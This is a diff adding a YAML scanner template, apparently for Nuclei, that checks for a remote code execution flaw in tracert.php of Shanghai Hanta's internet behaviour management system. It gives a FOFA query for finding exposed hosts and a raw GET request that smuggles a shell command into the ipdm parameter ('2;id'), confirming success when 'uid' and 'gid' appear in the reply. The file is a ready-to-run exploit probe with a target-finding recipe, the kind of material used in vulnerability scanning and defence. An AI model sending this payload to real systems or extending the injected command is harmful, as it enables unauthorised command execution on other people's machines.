@@ -1,0 +1,29 @@
+id: hanta-netbehavior-tracert-rce
+
+info:
+  name: "上海汉塔上网行为管理系统 tracert.php 远程代码执行漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="Antasys"
+      
+      上海汉塔网络科技有限公司开发的上网行为管理系统中，tracert.php组件存在可被利用的远程代码执行缺陷。攻击者通过构造恶意请求可绕过安全验证机制，在目标系统上执行任意命令。该系统作为网络行为管控解决方案，涉及网络协议分析、数据流控制等核心功能模块。
+  tags: 上海汉塔
+
+http:
+- raw:
+  - |
+    GET /dgn/dgn_tools/tracert.php?ipdm=2;id HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'uid'
+  - type: word
+    part: body
+    words:
+    - 'gid'
